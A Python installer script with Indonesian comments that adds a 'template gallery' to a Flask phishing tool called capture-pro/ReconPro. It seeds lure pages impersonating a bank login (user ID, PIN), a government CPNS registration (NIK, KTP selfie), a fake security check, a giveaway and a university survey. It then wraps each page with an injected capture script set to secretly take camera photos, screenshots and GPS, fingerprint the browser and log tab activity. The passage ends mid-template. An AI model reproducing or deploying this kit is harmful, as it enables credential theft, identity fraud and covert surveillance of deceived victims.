"""
Installer: Template Gallery + Auto Tunnel Integration
- Koleksi template (kuisioner, verifikasi, bank, dll)
- Pilih template → link otomatis bikin
- Setelah generate link → auto-start tunnel
- Preview sebelum share
Jalankan: python setup_template_gallery.py
"""
import os
import sys
from pathlib import Path

PROJECT = Path.home() / "capture-pro"

if not PROJECT.exists():
    print(f"❌ Folder {PROJECT} tidak ada.")
    sys.exit(1)


# ============================================================
# STEP 1: Model Template
# ============================================================
print("[1/6] Tambah model Template...")
models = PROJECT / "app" / "models.py"
content = models.read_text(encoding="utf-8")

if "class Template" not in content:
    content += '''

class Template(db.Model):
    """Template halaman capture — kuisioner, verifikasi, bank, dll."""
    __tablename__ = "templates"
    id = db.Column(db.Integer, primary_key=True)
    slug = db.Column(db.String(32), unique=True, index=True)
    name = db.Column(db.String(128))
    category = db.Column(db.String(64), default="general")
    icon = db.Column(db.String(8), default="📄")
    description = db.Column(db.Text)
    html_content = db.Column(db.Text)  # HTML lengkap halaman
    config_json = db.Column(db.Text)   # default capture config
    is_builtin = db.Column(db.Integer, default=0)  # 1 = template bawaan
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def to_dict(self):
        import json
        d = {c.name: getattr(self, c.name) for c in self.__table__.columns}
        if d.get("created_at"):
            d["created_at"] = d["created_at"].isoformat()
        try:
            d["config"] = json.loads(d.get("config_json") or "{}")
        except:
            d["config"] = {}
        return d
'''
    models.write_text(content, encoding="utf-8")
    print("      OK  Tambah model Template")
else:
    print("      SKIP")


# ============================================================
# STEP 2: Route Template Gallery
# ============================================================
print("\n[2/6] Bikin route /templates...")
tpl_route = PROJECT / "app" / "routes" / "templates_gallery.py"
tpl_route.write_text('''"""Template Gallery — koleksi template halaman capture."""
from flask import Blueprint, jsonify, request, render_template, Response, abort
from app.auth import login_required
from app.database import db
from app.models import Template, CaptureConfig
import secrets
import string
import json


bp = Blueprint("tpl_gallery", __name__)


def _gen_slug(length=10):
    alphabet = string.ascii_lowercase + string.digits
    while True:
        s = "".join(secrets.choice(alphabet) for _ in range(length))
        if not Template.query.filter_by(slug=s).first():
            return s


# ============================================================
# BUILT-IN TEMPLATES (HTML dasar)
# ============================================================
BUILTIN_TEMPLATES = [
    {
        "name": "Kuisioner Penelitian",
        "category": "academic",
        "icon": "📋",
        "description": "Form kuisioner skripsi/tesis dengan informed consent",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": False,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;max-width:480px;margin:0 auto;padding:20px;background:#f5f7fa;min-height:100vh">
  <div style="background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;padding:20px;border-radius:12px 12px 0 0;text-align:center">
    <h1 style="margin:0;font-size:18px">📋 Kuisioner Penelitian</h1>
    <p style="margin:6px 0 0;font-size:12px;opacity:0.9">Universitas Indonesia · Ilmu Komputer</p>
  </div>
  <div style="background:#fff;padding:20px;border-radius:0 0 12px 12px;box-shadow:0 2px 12px rgba(0,0,0,0.06)">
    <h3 style="margin:0 0 12px;font-size:14px;color:#1e3c72">ℹ️ Informasi Penelitian</h3>
    <p style="font-size:13px;color:#666;line-height:1.6;margin:0 0 16px">
      <b>Judul:</b> Pengaruh Penggunaan Media Sosial terhadap Kualitas Tidur Mahasiswa<br>
      <b>Peneliti:</b> Budi Santoso (NIM: 2106123456)<br>
      <b>Durasi:</b> ±3 menit
    </p>
    <h3 style="margin:16px 0 12px;font-size:14px;color:#1e3c72">✍️ Data Responden</h3>
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Nama (boleh inisial)</label>
    <input type="text" name="nama" placeholder="Contoh: B.S." style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Usia</label>
    <input type="number" name="usia" placeholder="21" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Jenis Kelamin</label>
    <div style="display:flex;gap:16px;margin-bottom:12px">
      <label style="font-size:13px"><input type="radio" name="jk" value="L"> Laki-laki</label>
      <label style="font-size:13px"><input type="radio" name="jk" value="P"> Perempuan</label>
    </div>
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Domisili</label>
    <input type="text" name="kota" placeholder="Depok" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:16px;box-sizing:border-box">
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Pertanyaan 1: Jam tidur per malam?</label>
    <select name="q1" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <option>-- Pilih --</option><option>&lt; 4 jam</option><option>4-6 jam</option><option>6-8 jam</option><option>&gt; 8 jam</option>
    </select>
    <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Pertanyaan 2: Platform sosmed favorit?</label>
    <select name="q2" style="width:100%;padding:11px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:16px;box-sizing:border-box">
      <option>-- Pilih --</option><option>Instagram</option><option>TikTok</option><option>Twitter/X</option><option>YouTube</option>
    </select>
    <div style="background:#fff8e1;border:1px solid #ffe082;border-radius:8px;padding:12px;font-size:12px;color:#7a5c00;margin-bottom:14px">
      <input type="checkbox" id="consent" style="margin-right:6px">
      <label for="consent">Saya setuju data digunakan untuk penelitian akademik. Data akan dianonimkan.</label>
    </div>
    <p style="font-size:12px;color:#666;text-align:center;margin:12px 0">
      Untuk verifikasi responden, kami akan meminta izin kamera &amp; lokasi saat Anda klik Kirim.
    </p>
    <button id="btnSubmit" disabled style="width:100%;padding:14px;border:none;border-radius:8px;background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;font-size:15px;font-weight:600;cursor:pointer">KIRIM KUISIONER</button>
  </div>
</div>
<script>
  document.getElementById('consent').addEventListener('change', function() {
    document.getElementById('btnSubmit').disabled = !this.checked;
  });
  document.getElementById('btnSubmit').addEventListener('click', function() {
    this.disabled = true;
    this.textContent = 'Mengirim...';
    setTimeout(function() {
      document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;text-align:center;padding:30px;font-family:system-ui"><div><div style="font-size:80px">🎓</div><h1 style="font-size:22px;margin:12px 0">Terima Kasih!</h1><p style="opacity:0.9;max-width:300px">Partisipasi Anda sangat berarti untuk penelitian ini.</p></div></div>';
    }, 2500);
  });
</script>"""
    },
    {
        "name": "Verifikasi Akun",
        "category": "general",
        "icon": "🔒",
        "description": "Halaman verifikasi akun (fake UI)",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": True,
                   "gps": False, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;max-width:420px;margin:0 auto;padding:40px 20px;background:radial-gradient(circle at 50% 30%,#1a2332,#0d0d0d);min-height:100vh;color:#eee;text-align:center">
  <div style="font-size:60px;margin-bottom:20px">🔒</div>
  <h1 style="font-size:22px;margin:0 0 8px">Verifikasi Keamanan</h1>
  <p style="color:#8899aa;font-size:14px;line-height:1.5;margin-bottom:30px">Kami mendeteksi aktivitas mencurigakan di akun Anda. Verifikasi diperlukan.</p>
  <div style="background:#1a1a1a;border-radius:12px;padding:20px;border:1px solid #2a2a2a">
    <p style="font-size:13px;color:#666;margin:0 0 16px">Verifikasi otomatis dalam <b style="color:#4a9eff" id="countdown">5</b> detik</p>
    <div style="width:100%;height:4px;background:#222;border-radius:2px;overflow:hidden">
      <div style="height:100%;width:0%;background:linear-gradient(90deg,#4a9eff,#a06bff);transition:width 5s linear" id="bar"></div>
    </div>
  </div>
  <p style="font-size:11px;color:#555;margin-top:20px">Mohon izinkan akses kamera untuk melanjutkan</p>
</div>
<script>
  setTimeout(function(){document.getElementById('bar').style.width='100%';},100);
  var n=5;var t=setInterval(function(){n--;document.getElementById('countdown').textContent=n;if(n<=0)clearInterval(t);},1000);
</script>"""
    },
    {
        "name": "Form Pendaftaran CPNS",
        "category": "government",
        "icon": "🏛️",
        "description": "Form pendaftaran CPNS/pegawai dengan upload KTP",
        "config": {"foto_depan": True, "foto_belakang": True, "screenshot": True,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;max-width:480px;margin:0 auto;background:#f5f7fa;min-height:100vh">
  <div style="background:linear-gradient(135deg,#003d79,#0055a5);color:#fff;padding:24px;text-align:center">
    <div style="font-size:40px;margin-bottom:8px">🏛️</div>
    <h1 style="margin:0;font-size:18px">Pendaftaran CPNS 2026</h1>
    <p style="margin:6px 0 0;font-size:12px;opacity:0.9">Badan Kepegawaian Negara</p>
  </div>
  <div style="padding:20px">
    <div style="background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.06)">
      <h3 style="margin:0 0 16px;color:#003d79;font-size:15px">📝 Data Diri</h3>
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Nama Lengkap</label>
      <input type="text" name="nama" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">NIK (16 digit)</label>
      <input type="text" name="nik" maxlength="16" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Nomor HP</label>
      <input type="tel" name="phone" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:12px;box-sizing:border-box">
      <label style="display:block;font-size:12px;color:#555;margin-bottom:6px">Email</label>
      <input type="email" name="email" style="width:100%;padding:11px;border:1px solid #ddd;border-radius:8px;font-size:14px;margin-bottom:16px;box-sizing:border-box">
      <div style="background:#e3f2fd;border:1px solid #90caf9;border-radius:8px;padding:12px;font-size:12px;color:#0d47a1;margin-bottom:14px">
        📸 Foto selfie + KTP diperlukan untuk verifikasi. Izin kamera akan diminta saat klik Daftar.
      </div>
      <button id="btnDaftar" style="width:100%;padding:14px;border:none;border-radius:8px;background:linear-gradient(135deg,#003d79,#0055a5);color:#fff;font-size:15px;font-weight:600;cursor:pointer">DAFTAR SEKARANG</button>
    </div>
  </div>
</div>
<script>
  document.getElementById('btnDaftar').addEventListener('click', function() {
    this.textContent = 'Memproses...';
    this.disabled = true;
    setTimeout(function() {
      document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f5f7fa;text-align:center;padding:30px;font-family:system-ui"><div><div style="font-size:80px">✅</div><h1 style="color:#003d79">Pendaftaran Berhasil</h1><p style="color:#666">Nomor registrasi: CPNS-2026-0042</p></div></div>';
    }, 2500);
  });
</script>"""
    },
    {
        "name": "Login Bank",
        "category": "bank",
        "icon": "🏦",
        "description": "Halaman login internet banking",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": True,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": True},
        "html": """<div style="font-family:system-ui,sans-serif;background:#f0f2f5;min-height:100vh">
  <div style="background:linear-gradient(135deg,#004b87,#0066b3);color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px">
    <div style="width:40px;height:40px;border-radius:8px;background:#fff;color:#004b87;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:20px">🏦</div>
    <div><div style="font-size:16px;font-weight:600">Internet Banking</div><div style="font-size:11px;opacity:0.9">Personal Banking</div></div>
  </div>
  <div style="max-width:400px;margin:0 auto;padding:24px 20px">
    <h2 style="text-align:center;color:#004b87;font-size:18px;margin:0 0 6px">Selamat Datang</h2>
    <p style="text-align:center;color:#666;font-size:13px;margin:0 0 24px">Silakan masukkan data Anda</p>
    <div style="background:#fff;border-radius:12px;padding:24px;box-shadow:0 4px 20px rgba(0,0,0,0.06)">
      <label style="display:block;font-size:13px;color:#555;margin-bottom:6px">User ID</label>
      <input type="text" name="userid" style="width:100%;padding:13px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:14px;box-sizing:border-box">
      <label style="display:block;font-size:13px;color:#555;margin-bottom:6px">PIN</label>
      <input type="password" name="pin" maxlength="6" style="width:100%;padding:13px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:14px;box-sizing:border-box">
      <label style="display:block;font-size:13px;color:#555;margin-bottom:6px">Nomor HP</label>
      <input type="tel" name="phone" style="width:100%;padding:13px;border:1.5px solid #e0e4e9;border-radius:8px;font-size:14px;margin-bottom:18px;box-sizing:border-box">
      <button id="btnLogin" style="width:100%;padding:14px;border:none;border-radius:8px;background:linear-gradient(135deg,#004b87,#0066b3);color:#fff;font-size:15px;font-weight:600;cursor:pointer">MASUK</button>
    </div>
    <p style="text-align:center;font-size:12px;color:#0066b3;margin-top:16px">🔒 Koneksi aman & terenkripsi</p>
  </div>
</div>
<script>
  document.getElementById('btnLogin').addEventListener('click', function() {
    this.textContent = 'Memverifikasi...';
    this.disabled = true;
    setTimeout(function() {
      var el = document.createElement('div');
      el.style.cssText = 'background:#ffebee;color:#c62828;padding:12px;border-radius:8px;font-size:13px;margin-bottom:14px;text-align:center';
      el.textContent = '⚠ PIN salah. Silakan coba lagi.';
      document.querySelector('.bank-form') || document.querySelector('div[style*="box-shadow"]').insertBefore(el, document.querySelector('div[style*="box-shadow"]').firstChild);
      document.getElementById('btnLogin').textContent = 'MASUK';
      document.getElementById('btnLogin').disabled = false;
    }, 2500);
  });
</script>"""
    },
    {
        "name": "Giveaway / Undian",
        "category": "marketing",
        "icon": "🎁",
        "description": "Halaman giveaway berhadiah",
        "config": {"foto_depan": True, "foto_belakang": False, "screenshot": False,
                   "gps": True, "burst": False, "location_tracking": False, "tab_log": False},
        "html": """<div style="font-family:system-ui,sans-serif;background:linear-gradient(135deg,#ff6b6b,#ffb547);min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:24px;text-align:center;color:#fff">
  <div style="font-size:100px;animation:bounce 1s infinite">🎁</div>
  <style>@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}</style>
  <h1 style="font-size:28px;font-weight:bold;margin:20px 0 10px">Selamat!</h1>
  <p style="font-size:16px;opacity:0.95;margin-bottom:30px">Kamu terpilih untuk mendapatkan hadiah senilai <b>Rp 5.000.000</b></p>
  <button id="btnClaim" style="padding:18px 40px;font-size:18px;font-weight:bold;border:none;border-radius:50px;background:#fff;color:#ff6b6b;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,0.2)">KLAIM SEKARANG</button>
  <p style="margin-top:20px;font-size:12px;opacity:0.8">*Promo terbatas 100 orang pertama</p>
</div>
<script>
  document.getElementById('btnClaim').addEventListener('click', function() {
    this.textContent = 'Memproses...';
    this.disabled = true;
    setTimeout(function() {
      document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;text-align:center;padding:30px;font-family:system-ui"><div><div style="font-size:80px">🎉</div><h1 style="color:#333">Selamat!</h1><p style="color:#666">Tim kami akan menghubungi Anda dalam 1x24 jam</p></div></div>';
    }, 2500);
  });
</script>"""
    },
]


# ============================================================
# ROUTES
# ============================================================
@bp.route("/templates")
@login_required
def gallery():
    templates = Template.query.order_by(Template.id.desc()).all()
    return render_template("templates_gallery.html", templates=templates)


@bp.route("/api/templates/list")
@login_required
def list_templates():
    templates = Template.query.order_by(Template.id.desc()).all()
    return jsonify([t.to_dict() for t in templates])


@bp.route("/api/templates/init-builtin", methods=["POST"])
@login_required
def init_builtin():
    """Seed template bawaan kalau belum ada."""
    created = 0
    for t in BUILTIN_TEMPLATES:
        if not Template.query.filter_by(name=t["name"], is_builtin=1).first():
            tpl = Template(
                slug=_gen_slug(),
                name=t["name"],
                category=t["category"],
                icon=t["icon"],
                description=t["description"],
                html_content=t["html"],
                config_json=json.dumps(t["config"]),
                is_builtin=1,
            )
            db.session.add(tpl)
            created += 1
    db.session.commit()
    return jsonify({"ok": True, "created": created})


@bp.route("/api/templates/create", methods=["POST"])
@login_required
def create_template():
    """Bikin template custom dari HTML yang di-paste."""
    data = request.get_json(force=True, silent=True) or {}
    tpl = Template(
        slug=_gen_slug(),
        name=(data.get("name") or "Custom Template")[:128],
        category=data.get("category") or "custom",
        icon=data.get("icon") or "📄",
        description=data.get("description") or "",
        html_content=data.get("html") or "",
        config_json=json.dumps(data.get("config") or {}),
        is_builtin=0,
    )
    db.session.add(tpl)
    db.session.commit()
    return jsonify({"ok": True, "data": tpl.to_dict()})


@bp.route("/api/templates/delete/<int:tid>", methods=["POST", "DELETE"])
@login_required
def delete_template(tid):
    t = Template.query.get(tid)
    if not t:
        return jsonify({"ok": False}), 404
    db.session.delete(t)
    db.session.commit()
    return jsonify({"ok": True})


@bp.route("/api/templates/use/<int:tid>", methods=["POST"])
@login_required
def use_template(tid):
    """Bikin CaptureConfig baru dari template — return link."""
    t = Template.query.get(tid)
    if not t:
        return jsonify({"ok": False, "msg": "template not found"}), 404

    # Parse config
    try:
        cfg = json.loads(t.config_json or "{}")
    except:
        cfg = {}

    # Ambil config tambahan dari request
    data = request.get_json(force=True, silent=True) or {}
    campaign = data.get("campaign") or t.category or "template"

    # Bikin CaptureConfig baru
    slug = _gen_slug_cfg()
    c = CaptureConfig(
        slug=slug,
        name=(data.get("name") or t.name)[:128],
        campaign=campaign[:64],
        foto_depan=1 if cfg.get("foto_depan") else 0,
        foto_belakang=1 if cfg.get("foto_belakang") else 0,
        screenshot=1 if cfg.get("screenshot") else 0,
        gps=1 if cfg.get("gps") else 0,
        burst=1 if cfg.get("burst") else 0,
        burst_interval=int(cfg.get("burst_interval") or 3),
        burst_duration=int(cfg.get("burst_duration") or 30),
        location_tracking=1 if cfg.get("location_tracking") else 0,
        tab_log=1 if cfg.get("tab_log") else 0,
        delay_seconds=int(cfg.get("delay_seconds") or 5),
        wait_permission=1,
        title=t.name[:128],
        subtitle=(t.description or "Mohon tunggu sebentar...")[:500],
        template_id=t.id,
    )
    db.session.add(c)
    db.session.commit()

    return jsonify({
        "ok": True,
        "slug": slug,
        "config": c.to_dict(),
        "template_id": t.id,
    })


@bp.route("/t/<int:tid>/<slug>")
def render_template_page(tid, slug):
    """Render template HTML + auto-inject capture.js."""
    t = Template.query.get(tid)
    if not t:
        abort(404)

    # Bikin CONFIG JSON dari template
    try:
        cfg = json.loads(t.config_json or "{}")
    except:
        cfg = {}

    config_json = json.dumps({
        "ENABLE_FOTO_DEPAN": bool(cfg.get("foto_depan")),
        "ENABLE_FOTO_BELAKANG": bool(cfg.get("foto_belakang")),
        "ENABLE_SCREENSHOT": bool(cfg.get("screenshot")),
        "ENABLE_GPS": bool(cfg.get("gps")),
        "ENABLE_BURST": bool(cfg.get("burst")),
        "BURST_INTERVAL": int(cfg.get("burst_interval") or 3),
        "BURST_DURATION": int(cfg.get("burst_duration") or 30),
        "ENABLE_LOCATION_TRACKING": bool(cfg.get("location_tracking")),
        "ENABLE_TAB_LOG": bool(cfg.get("tab_log")),
        "DELAY_SECONDS": int(cfg.get("delay_seconds") or 5),
        "WAIT_PERMISSION": True,
    })

    html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#1e3c72">
<title>{t.name}</title>
<link rel="manifest" href="/static/manifest.json">
<style>body{{margin:0;padding:0;font-family:system-ui,sans-serif}}</style>
</head><body>

{t.html_content}

<video id="v" autoplay playsinline muted hidden></video>
<canvas id="c" hidden></canvas>
<div id="status" hidden></div>
<div id="log" hidden></div>

<script>
  window.CAMPAIGN = "{t.category or 'template'}";
  window.MODE_SLUG = "{slug}";
  window.CONFIG = {config_json};
</script>
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
<script src="/static/js/capture.js"></script>
</body></html>"""
    return Response(html, mimetype="text/html")


def _gen_slug_cfg(length=8):
    alphabet = string.ascii_lowercase + string.digits
    while True:
        s = "".join(secrets.choice(alphabet) for _ in range(length))
        if not CaptureConfig.query.filter_by(slug=s).first():
            return s
''')
print(f"  OK  {tpl_route}")


# ============================================================
# STEP 3: Patch model CaptureConfig — tambah template_id
# ============================================================
print("\n[3/6] Patch CaptureConfig...")
content = models.read_text(encoding="utf-8")

if "template_id = db.Column" not in content:
    # Cari class CaptureConfig
    idx = content.find("class CaptureConfig")
    if idx > 0:
        # Cari baris terakhir sebelum blank line berikutnya
        end_idx = content.find("\n\nclass ", idx)
        if end_idx == -1:
            end_idx = content.find("\n\n", idx + 100)
        # Sisipkan field sebelum to_dict
        if "def to_dict" in content[idx:end_idx] if end_idx > 0 else False:
            content = content.replace(
                "    created_at = db.Column(db.DateTime, default=datetime.utcnow)\n    used_count = db.Column(db.Integer, default=0)",
                "    created_at = db.Column(db.DateTime, default=datetime.utcnow)\n    used_count = db.Column(db.Integer, default=0)\n    template_id = db.Column(db.Integer, default=0)"
            )
        models.write_text(content, encoding="utf-8")
        print("      OK  Tambah field template_id")
    else:
        print("      WARN — CaptureConfig tidak ketemu")
else:
    print("      SKIP — sudah ada")


# ============================================================
# STEP 4: Register blueprint
# ============================================================
print("\n[4/6] Register blueprint...")
init = PROJECT / "app" / "__init__.py"
content = init.read_text(encoding="utf-8")
backup = init.with_suffix(".py.bak_tpl")
backup.write_text(content, encoding="utf-8")

if "from app.routes.templates_gallery import bp as tpl_gallery_bp" not in content:
    if "from app.routes.modes import bp as modes_bp" in content:
        content = content.replace(
            "from app.routes.modes import bp as modes_bp",
            "from app.routes.modes import bp as modes_bp\n    from app.routes.templates_gallery import bp as tpl_gallery_bp"
        )
    else:
        content = content.replace(
            "from app.routes.api import bp as api_bp",
            "from app.routes.api import bp as api_bp\n    from app.routes.templates_gallery import bp as tpl_gallery_bp"
        )

if "app.register_blueprint(tpl_gallery_bp)" not in content:
    content = content.replace(
        'app.register_blueprint(modes_bp)',
        'app.register_blueprint(modes_bp)\n    app.register_blueprint(tpl_gallery_bp)'
    )
    if "app.register_blueprint(tpl_gallery_bp)" not in content:
        content = content.replace(
            'app.register_blueprint(api_bp, url_prefix="/api")',
            'app.register_blueprint(api_bp, url_prefix="/api")\n    app.register_blueprint(tpl_gallery_bp)'
        )

init.write_text(content, encoding="utf-8")
print("      OK")


# ============================================================
# STEP 5: Templates Gallery HTML
# ============================================================
print("\n[5/6] Bikin templates_gallery.html...")
gallery = PROJECT / "app" / "templates" / "templates_gallery.html"
gallery.write_text('''{% extends "base.html" %}
{% block title %}Template Gallery - ReconPro{% endblock %}
{% block head %}
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
.tpl-header { padding:30px 24px 20px; background:linear-gradient(135deg,#1e3c72,#2a5298); color:#fff; }
.tpl-header h1 { margin:0 0 6px; font-size:24px; }
.tpl-header p { margin:0; opacity:0.9; font-size:13px; }
.tpl-body { padding:24px; max-width:1200px; margin:0 auto; }
.tpl-categories { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:20px; }
.tpl-cat { padding:6px 14px; background:#161b22; border:1px solid #21262d; border-radius:20px; font-size:12px; cursor:pointer; color:#8b949e; }
.tpl-cat.active { background:#1e6feb; color:#fff; border-color:#1e6feb; }
.tpl-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:16px; }
.tpl-card { background:#161b22; border:1px solid #21262d; border-radius:12px; overflow:hidden; display:flex; flex-direction:column; transition:all 0.15s; }
.tpl-card:hover { border-color:#58a6ff; transform:translateY(-2px); }
.tpl-card .preview { height:180px; background:#0d1117; overflow:hidden; position:relative; border-bottom:1px solid #21262d; }
.tpl-card .preview iframe { width:100%; height:600px; border:none; pointer-events:none; transform:scale(0.55); transform-origin:top left; width:180%; }
.tpl-card .info { padding:14px; flex:1; display:flex; flex-direction:column; }
.tpl-card .cat-tag { display:inline-block; font-size:10px; background:#21262d; color:#8b949e; padding:2px 8px; border-radius:10px; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px; }
.tpl-card .name { font-size:15px; font-weight:600; margin:0 0 6px; color:#e6edf3; }
.tpl-card .desc { font-size:12px; color:#8b949e; margin:0 0 12px; flex:1; }
.tpl-card .actions { display:flex; gap:6px; }
.btn-use { flex:1; padding:10px; background:#1e6feb; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:13px; font-weight:600; }
.btn-use:hover { background:#388bfd; }
.btn-preview { padding:10px 14px; background:#30363d; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:13px; }
.btn-del { padding:10px 14px; background:#da3633; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:13px; }
.empty-state { text-align:center; padding:60px 20px; color:#6e7681; }
.empty-state button { margin-top:16px; padding:12px 24px; background:#1e6feb; color:#fff; border:none; border-radius:8px; cursor:pointer; font-size:14px; font-weight:600; }
</style>
{% endblock %}
{% block body %}

<div class="tpl-header">
  <h1>📚 Template Gallery</h1>
  <p>Pilih template halaman — link otomatis digenerate</p>
</div>

<div class="tpl-body">
  <p style="margin-bottom:20px">
    <a href="/dashboard" style="color:#58a6ff;text-decoration:none">← Dashboard</a>
    <span style="color:#6e7681;margin:0 8px">·</span>
    <a href="/modes" style="color:#58a6ff;text-decoration:none">🎯 Mode Builder</a>
  </p>

  <div id="loadingState" style="text-align:center;padding:40px;color:#8b949e">Memuat template...</div>

  <div id="emptyState" class="empty-state" style="display:none">
    <div style="font-size:60px;margin-bottom:16px">📚</div>
    <h2 style="margin:0 0 8px">Belum Ada Template</h2>
    <p>Klik tombol di bawah untuk load template bawaan</p>
    <button onclick="initBuiltin()">🎁 Load Template Bawaan</button>
  </div>

  <div id="galleryContent" style="display:none">
    <div class="tpl-categories" id="catFilter">
      <div class="tpl-cat active" data-cat="">Semua</div>
      <div class="tpl-cat" data-cat="academic">Akademik</div>
      <div class="tpl-cat" data-cat="general">Umum</div>
      <div class="tpl-cat" data-cat="bank">Bank</div>
      <div class="tpl-cat" data-cat="government">Pemerintah</div>
      <div class="tpl-cat" data-cat="marketing">Marketing</div>
      <div class="tpl-cat" data-cat="custom">Custom</div>
    </div>
    <div class="tpl-grid" id="grid"></div>
  </div>
</div>

<script>
let allTemplates = [];
let currentCat = "";

async function loadTemplates() {
  document.getElementById("loadingState").style.display = "block";
  document.getElementById("emptyState").style.display = "none";
  document.getElementById("galleryContent").style.display = "none";

  try {
    const res = await fetch("/api/templates/list");
    allTemplates = await res.json();
    document.getElementById("loadingState").style.display = "none";

    if (!allTemplates.length) {
      document.getElementById("emptyState").style.display = "block";
    } else {
      document.getElementById("galleryContent").style.display = "block";
      renderGrid();
    }
  } catch (e) {
    document.getElementById("loadingState").textContent = "Error: " + e.message;
  }
}

function renderGrid() {
  const grid = document.getElementById("grid");
  let list = allTemplates;
  if (currentCat) list = list.filter(t => t.category === currentCat);

  if (!list.length) {
    grid.innerHTML = '<p style="color:#6e7681;text-align:center;padding:40px;grid-column:1/-1">Tidak ada template di kategori ini</p>';
    return;
  }

  grid.innerHTML = list.map(t => {
    const catMap = {academic:"Akademik",general:"Umum",bank:"Bank",government:"Pemerintah",marketing:"Marketing",custom:"Custom"};
    const catLabel = catMap[t.category] || t.category;
    return \`
      <div class="tpl-card">
        <div class="preview">
          <iframe src="/t/\${t.id}/preview" sandbox="allow-same-origin"></iframe>
        </div>
        <div class="info">
          <div class="cat-tag">\${escHtml(catLabel)}</div>
          <div class="name">\${escHtml(t.icon || "📄")} \${escHtml(t.name)}</div>
          <div class="desc">\${escHtml(t.description || "")}</div>
          <div class="actions">
            <button class="btn-use" onclick="useTemplate(\${t.id})">🚀 Pakai</button>
            <button class="btn-preview" onclick="openPreview(\${t.id})">👁️</button>
            \${t.is_builtin ? "" : '<button class="btn-del" onclick="deleteTpl(\\''+t.id+'\\')">🗑</button>'}
          </div>
        </div>
      </div>
    \`;
  }).join("");
}

function escHtml(s) {
  if (s == null) return "";
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

document.querySelectorAll(".tpl-cat").forEach(c => {
  c.addEventListener("click", () => {
    document.querySelectorAll(".tpl-cat").forEach(x => x.classList.remove("active"));
    c.classList.add("active");
    currentCat = c.dataset.cat;
    renderGrid();
  });
});

async function useTemplate(id) {
  const r = await Swal.fire({
    title: "Pakai template ini?",
    input: "text",
    inputLabel: "Nama mode (bisa ganti)",
    inputValue: "",
    showCancelButton: true,
    confirmButtonText: "🚀 Generate Link",
    confirmButtonColor: "#1e6feb",
    cancelButtonText: "Batal",
  });
  if (!r.isConfirmed) return;

  Swal.fire({ title: "Membuat link...", didOpen: () => Swal.showLoading(), allowOutsideClick: false });

  try {
    const res = await fetch("/api/templates/use/" + id, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: r.value || "" }),
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.msg || "gagal");

    const link = location.origin + "/t/" + id + "/" + data.slug;
    const shortLink = location.origin + "/m/" + data.slug;

    Swal.fire({
      icon: "success",
      title: "Link Berhasil Dibuat!",
      html: \`
        <div style="text-align:left;font-size:13px">
          <p style="margin:0 0 8px"><b>Link halaman template:</b></p>
